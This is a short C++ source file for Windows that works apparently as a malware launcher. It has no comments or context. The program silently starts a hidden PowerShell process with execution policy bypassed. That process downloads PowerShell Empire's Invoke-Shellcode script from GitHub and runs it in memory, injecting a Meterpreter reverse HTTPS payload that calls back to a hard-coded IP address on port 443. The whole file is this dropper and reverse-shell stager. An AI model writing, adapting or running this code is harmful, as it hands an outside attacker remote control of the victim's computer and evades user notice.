#include <windows.h>
#include <ShellApi.h>
#include <stdio.h>
#include <iostream>
#include <string>
#include <io.h>   // For access().

using namespace std;

int main ()
{
 	ostringstream os;
 	os << "-ExecutionPolicy ByPass -NoProfile -NonInteractive -WindowStyle Hidden -noprofile -windowstyle hidden iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/PowerShellEmpire/Empire/master/data/module_source/code_execution/Invoke-Shellcode.ps1');Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost  54.88.167.79 -Lport 443 -Force;";
 	string op = "open";
 	string ps = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\PowerShell.exe";
 	string param = os.str();	
	ShellExecuteA(NULL, op.c_str(), ps.c_str(), param.c_str(), NULL, SW_HIDE);
	return 0;
}
